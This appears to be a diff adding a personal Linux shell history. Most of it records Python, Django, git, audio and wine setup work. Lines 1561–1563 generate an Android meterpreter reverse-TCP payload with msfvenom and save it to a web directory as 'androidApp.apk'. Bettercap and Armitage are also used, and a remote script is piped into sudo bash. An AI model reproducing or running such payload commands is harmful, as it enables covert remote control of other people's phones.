+ 1108  pip3 install phonenumbers
+ 1112  pip3 install speechRecognition
+ 1113  pip3 install pyttsx3
+ 1114  pip3 install PyAudio\n
+ 1117  sudo alsa force-reload
+ 1119  arecord -l
+ 1120  aplay -l
+ 1121  sudo nano /etc/asound.conf\n
+ 1141  sudo /opt/lampp
+ 1142  sudo /opt/lampp/
+ 1143  sudo /opt
+ 1157  sudo chmod -R 777 Ndungutse_jean_de_dieu_National_Pratical_Exam_2024
+ 1158  cd Ndungutse_jean_de_dieu_National_Pratical_Exam_2024
+ 1164  pip3 install pywhatkit
+ 1165  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/message/message.py"
+ 1169  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/what.py"
+ 1170  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/many.py"
+ 1172  pip3 install pandas
+ 1173  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/message/m.py"
+ 1175  pip3 install wikipedia
+ 1180  pip3 install wikipediaapi
+ 1181  pip3 install wikipedia-api pyttsx3\n
+ 1182  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/voice.py"
+ 1196  sudo apt-get install alsa-utils pulseaudio
+ 1197  sudo alsa force-reload\n
+ 1198  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/alex.py"
+ 1200  sudo apt-get install alsa-utils\n
+ 1201  aplay -l\n
+ 1202  arecord -l\n
+ 1203  sudo apt-get install jackd2\n
+ 1204  jackd -d alsa\n
+ 1205  sudo apt-get install pulseaudio
+ 1208  pulseaudio --start
+ 1210  pip3 install selenium\n
+ 1220  /bin/python3 "/home/gitego/Documents/content youtube/start/AI/ai.py"
+ 1227  fgr
+ 1233  /usr/lib/firefox-esr/firefox-esr
+ 1236  unzip vpnbook-openvpn-us1
+ 1237  unzip vpnbook-openvpn-us1.zip
+ 1238  openvpn vpnbook-us1-tcp443.ovpn
+ 1239  sudo openvpn vpnbook-us1-tcp443.ovpn
+ 1240  sudo openvpn vpnbook-us1-udp53.ovpn
+ 1241  sudo openvpn vpnbook-us1-udp25000.ovpn 
+ 1252  pip3 install pyscreenshot
+ 1253  pip3 freeze
+ 1255  pip3 install pywin32
+ 1257  pip3 install pytesseract
+ 1260  sudo apt-get install tesseract-ocr\n
+ 1261  /bin/python3 "/home/gitego/Documents/content youtube/learn python/screenshort/tex.py"
+ 1263  '/home/gitego/Documents/content youtube/learn python/screenshort/tex.py'/bin/python3 "/home/gitego/Documents/content youtube/learn python/screenshort/screen.py"
+ 1270  python3
+ 1273  code
+ 1281  sudo systemctl enable bluetooth
+ 1282  sudo systemctl start bluetooth
+ 1283  sudo systemctl status bluetooth\n
+ 1294  sudo chmod 777 manager-linux-x64.run
+ 1295  sudo manager-linux-x64.run
+ 1299  mkdir jado
+ 1301  sudo chmod -R 777 jado
+ 1302  cd jado
+ 1303  home.php
+ 1308  nano sources.list
+ 1309  cat /etc/apt/sources.list
+ 1310  nano cat /etc/apt/sources.list
+ 1314  libreoffice
+ 1316  sudo chmod -R 777 screen.py 
+ 1319  sudo libreoffice\n
+ 1320  sudo apt update\n
+ 1321  sudo apt --fix-broken install\n
+ 1323  sudo apt install libreoffice\n
+ 1324  libreoffice\n
+ 1329  sudo chmod -R 777 screen.desktop\n
+ 1330  cd /etc/apt
+ 1332  nano sources.list~
+ 1335  git@github.com:ndunguts/shop.git
+ 1336  git git@github.com:ndunguts/shop.git
+ 1338  ssh-keygen -t rsa -b 4096 -C "ndungutsejean5@gmail.com"\n
+ 1339  eval "$(ssh-agent -s)"\n
+ 1340  ssh-add ~/.ssh/id_rsa\n
+ 1341  cat ~/.ssh/id_rsa.pub\n
+ 1342  ssh -T https://github.com/ndunguts/shop\n
+ 1344  git config --global --add safe.directory /opt/lampp/htdocs/jazz\n
+ 1345  git remote add origin git@github.com:ndunguts/shop\n
+ 1346  git remote -v\n
+ 1347  git push -u origin master  # or main\n
+ 1350  git commit -m "shop web_site"
+ 1351  git push -u origin main\n
+ 1353  /bin/python3 "/home/gitego/Documents/python app/whiteboard.py"
+ 1361  django-admin startproject website\n
+ 1362  cd website
+ 1363  python manage.py startapp web
+ 1366  pip --version
+ 1367  pip 24.1.1 from /usr/lib/python3/dist-packages/pip (python 3.11)
+ 1369  python3 -m venv web_site\n
+ 1379  cd ..
+ 1383  django-admin startproject web_site1\n
+ 1384  cd web_site1
+ 1385  python3 manage.py startapp web
+ 1387  python3 makemigrations web
+ 1388  python3 manage.py  makemigrations web
+ 1391  python3 manage.py sqlmigrate 0001
+ 1392  python3 manage.py sqlmigrate web 0001
+ 1408  cd htdocs/
+ 1411  cheese
+ 1414  cd /opt/lampp/
+ 1420  /bin/python3 /home/gitego/.vscode/extensions/ms-python.python-2024.12.1-linux-x64/python_files/printEnvVariablesToFile.py /home/gitego/.vscode/extensions/ms-python.python-2024.12.1-linux-x64/python_files/deactivate/zsh/envVars.txt
+ 1421  /bin/python3 "/home/gitego/Documents/content youtube/learn python/screenshort/screen.py"
+ 1426  /bin/python3 /home/gitego/Documents/pygame/gamenew.py
+ 1430  aut
+ 1431  pkexec x-terminal-emulator
+ 1435  ventoy-1.0.97
+ 1437  ./VentoyGUI.x86_64
+ 1441  source web_site/bin/activate\n
+ 1442  python3 manage.py startapp chat
+ 1448  python manage.py createsuper\n
+ 1449  python manage.py createsuperuser
+ 1451  pip install pillow
+ 1461  \n[1564:1591:0813/075426.767619:ERROR:connection_factory_impl.cc(434)] Failed to connect to MCS endpoint with error -105\n
+ 1462  Created TensorFlow Lite XNNPACK delegate for CPU.
+ 1463  [1564:1564:0813/063620.564339:ERROR:interface_endpoint_client.cc(722)] Message 1 rejected by interface blink.mojom.WidgetHost
+ 1464  Attempting to use a delegate that only supports static-sized tensors with a graph that has dynamic-sized tensors (tensor#58 is a dynamic-sized tensor).
+ 1465  Fontconfig error: Cannot load default config file: No such file: (null)
+ 1469  sudo dpkg --add-architecture i386
+ 1471  sudo apt update && sudo apt upgrade -y\n
+ 1472  sudo apt install wine wine64 wine32 winbind winetricks
+ 1476  wine npp.8.6.7.Installer.x64.exe.sig\n
+ 1479  wine Goodies_Suite-26-INT-3000-1.0.exe
+ 1480  wine Archicad-26-INT-3001-1.1.exe
+ 1483  wine Archicad Starter.exe
+ 1484  wine Archicad.exe
+ 1492  lsusb
+ 1494  thunar
+ 1500  sudo Ventoy2Disk.sh 
+ 1501  sudo ./Ventoy2Disk.sh 
+ 1502  ./VentoyVlnk.sh
+ 1503  sudo ./VentoyVlnk.sh
+ 1508  /bin/python3 /home/gitego/.vscode/extensions/ms-python.python-2024.12.2-linux-x64/python_files/printEnvVariablesToFile.py /home/gitego/.vscode/extensions/ms-python.python-2024.12.2-linux-x64/python_files/deactivate/zsh/envVars.txt
+ 1509  python manage.py runserver
+ 1521  python manage.py makemigrations
+ 1522  python manage.py migrate\n
+ 1529  django-admin startproject system
+ 1532  python3 manage.py startapp users
+ 1533  cd .
+ 1538  /bin/python3
+ 1539  /bin/python3 /home/gitego/.vscode/extensions/ms-python.python-2024.12.3-linux-x64/python_files/printEnvVariablesToFile.py /home/gitego/.vscode/extensions/ms-python.python-2024.12.3-linux-x64/python_files/deactivate/zsh/envVars.txt
+ 1542  cd system
+ 1552  x
+ 1560  ifconfig\n
+ 1561  msfvenom -help
+ 1562  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 R > /var/www/html/androidApp.apk
+ 1563  sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 R > /var/www/html/androidApp.apk
+ 1565  sudo bettercap
+ 1567  dpkg -l | grep armitage\n
+ 1568  sudo apt-get install armitage
+ 1569  sudo -E java -jar /usr/share/armitage/armitage.jar
+ 1575  # for Debian/Ubuntu\nsudo apt install ffmpeg libsdl2-2.0-0 adb wget \\n                 gcc git pkg-config meson ninja-build libsdl2-dev \\n                 libavcodec-dev libavdevice-dev libavformat-dev libavutil-dev \\n                 libswresample-dev libusb-1.0-0 libusb-1.0-0-dev
+ 1576  git clone https://github.com/Genymobile/scrcpy\ncd scrcpy\n./install_release.sh
+ 1577  git pull\n./install_release.sh
+ 1579  sudo ninja -Cbuild-auto uninstall
+ 1580  sudo apt-get install scrcpy
+ 1583  sudo apt install software-properties-common
+ 1584  sudo add-apt-repository ppa:deadsnakes/ppa
+ 1585  sudo apt-get update\n
+ 1587  sudo apt install snapd
+ 1588  sudo systemctl enable --now snapd.socket\nsudo ln -s /var/lib/snapd/snap /snap\n
+ 1590  scrcpy
+ 1591  sudo snap install scrcpy\n
+ 1592  sudo scrcpy
+ 1593  snap scrpy
+ 1594  snap scrcpy
+ 1595  sudo snap install core\n
+ 1596  sudo apt-get install scrcpy\n
+ 1598  ./run
+ 1599  meson builddir\nninja -C builddir\n
+ 1600  ./gradlew assembleDebug\n
+ 1601  ./run BUILDDIR <scrcpy options>\n
+ 1602  ./run builddir\n
+ 1603  ./run build\n
+ 1604  cd
+ 1606  node -v
+ 1608  cd Desktop
+ 1609  mkdir  node
+ 1610  cd node
+ 1614  node app.js
+ 1615  chrome
+ 1627  django-admin startproject social
+ 1629  cd social
+ 1630  python3 manage.py startapp system
+ 1633  cd /opt/\nsudo wget https://github.com/rsmudge/armitage/releases/download/20210930/armitage20210930.tgz\nsudo tar -xvzf armitage20210930.tgz\n
+ 1641  sudo chmod -R 777 kevin
+ 1642  cd kevin
+ 1649  sudo apt update
+ 1650  sudo apt upgrade\n
+ 1663  python3  stytex.py
+ 1668  python3 gtg.py
+ 1673  p/bin/python3 /home/gitego/Desktop/lear/gtg.py
+ 1675  sudo apt install obs
+ 1680  sudo add-apt-repository ppa:obsproject/obs-studio
+ 1681  sudo apt install obs-studio
+ 1684  firefox
+ 1708  /bin/python3 /home/gitego/Desktop/lear/gtg.py
+ 1713  sudo apt install curl ca-certificates -y
+ 1714  curl https://repo.waydro.id | sudo bash
+ 1715  sudo apt install waydroid -y
+ 1716  sudo xbps-install -S waydroid
+ 1717  sudo apt install waydroid 
+ 1723  kdenlive        \n
+ 1733  wine CapCut_7376205375613272081_installer.dmg
+ 1734  sudo chmod 777 DXSETUP.exe
+ 1735  wine DXSETUP.exe
+ 1737  wine --version
+ 1738  wget https://raw.githubusercontent.com/Winetricks/winetricks/master/src/winetricks
+ 1739  chmod +x winetricks
+ 1740  sudo ./winetricks d3dx9
+ 1744  pip install speech_recognition
+ 1745  pip install speech-recognition
+ 1748  pip install speech_recognition\n
+ 1749  deactivate\n
+ 1752  pip3 install speech_recognition\n
+ 1753  python3 --version
+ 1754  python3.12 -m venv venv\n
+ 1756  pip install SpeechRecognition\n
+ 1757  pip install SpeechRecognition --break-system-packages\n
+ 1758  python3.12 app4.py
+ 1759  "/home/gitego/Documents/python app/venv/bin/python" "/home/gitego/Documents/python app/app4.py"
+ 1761  pip install pyttsx3\n
+ 1763  pip install pywhatkit
+ 1764  python3 app4.py
+ 1765  /bin/python3 "/home/gitego/Documents/python app/app4.py"
+ 1767  /usr/bin/python3.11 "/home/gitego/Documents/python app/app4.py"
+ 1781  zmnnh
+ 1789  django-admin startproject mysql
+ 1790  cd mysql
+ 1791  python3 manage.py startapp mys
+ 1793  /home/gitego/Documents/django1/mysql/venv/bin/python /home/gitego/Documents/django1/mysql/mys/ro.py
+ 1794  sudo apt install mysqlclient
+ 1795  sudo apt-get install python3-dev default-libmysqlclient-dev build-essential\n
+ 1796  sudo apt-get install python3-venv\n
+ 1808  service mysql status
+ 1836  sudo mkdr you
+ 1837  mkdir yo
+ 1838  mv yo .yo
+ 1839  li
+ 1840  sudo li
+ 1841  mv .yo yo
+ 1843  mv yo
+ 1844  rm yo
+ 1845  rmkdir yo
+ 1846  rmdir yo
+ 1852  sudo mysql -u root -p\n
+ 1853  sudo mysql -u root\n
+ 1857  ..
+ 1859  sudo ./manager-linux-x64.run
+ 1862  cd /opt
+ 1863  cd lampp/
+ 1864  cd htdocs
+ 1867  exit
+ 1868  obs
+ 1874  sudo ./VentoyGUI.x86_64
+ 1879  .git
+ 1880  git nit
+ 1881  git init
+ 1882  git@github.com:ndunguts/amategeko.git
+ 1883  git add README.md
+ 1885  git commit -m "first commit"
+ 1886  git remote add origin git@github.com:ndunguts/amategeko.git
+ 1887  git push -u origin main
+ 1898  sudo aptitude install putty
+ 1899  sudo apt install putty
+ 1900  putty
+ 1903  service mysqli start\n
+ 1909  sudo screen -r gitego
+ 1910  sudo screen -g gitego
+ 1911  sudo screen -s gitego
+ 1914  sudo screen -S gitego
+ 1915  sudo screen -R gitego
+ 1916  screen -ls\n
+ 1929  git commit -m "seco commit"
+ 1934  xfce4-settings-manager
+ 1946  /home/gitego/Documents/django1/mysql/venv/bin/python
+ 1950  mysql -u root -p
+ 1951  service mysql stop
+ 1964  python3 manage.py createsuperuser
+ 1982  /usr/bin/google-chrome-stable
+ 1991  git commit -m "disign"
+ 1999  ssh root@85.31.238.68
+ 2000  /bin/python3 /home/gitego/.vscode/extensions/ms-python.python-2024.14.1-linux-x64/python_files/printEnvVariablesToFile.py /home/gitego/.vscode/extensions/ms-python.python-2024.14.1-linux-x64/python_files/deactivate/zsh/envVars.txt
+ 2005  pip install mysqlclient\n
+ 2006  opt install python3-mysqlclient
+ 2007  opt install python3-pymysql
+ 2008  python3 manage.py runserver
+ 2009  ^[[200~rm -rf venv
+ 2010  rm -rf venv\n
+ 2013  pip install pymysql\n
+ 2016  pip install django\n
+ 2018  python3 -m venv venv\n
+ 2025  /usr/bin/google-chrome-stable\n
+ 2026  fgrf
+ 2033  code .
+ 2035  service mysql start
+ 2036  clear
+ 2038  pip install mysqlclient
+ 2039  source venv/bin/activate\n
+ 2040  python3 manage.py makemigrations
+ 2041  python3 manage.py migrate\n
+ 2042  python3 manage.py runserver\n
+ 2043  git pull origin main
+ 2044  git pull origin master
+ 2045  git pull --rebase origin master\n
+ 2046  git add .
+ 2047  git commit -m "settings"
+ 2048  git push -u origin master\n
+ 2049  git rebase --continue\n
+ 2050  git push origin master\n
+ 2051  git branch\n
+ 2052  git fetch origin\n
+ 2053  git diff origin/master\n
+ 2055  cd Documents
+ 2057  cd django1/mysql/mys/
+ 2059  nano models.py
+ 2060  git status
+ 2061  git log --oneline
+ 2063  lsf
+ 2064  ls
+ 2065  mysql -u root
+ 2066  sudo mysql -u root
+ 2067  history
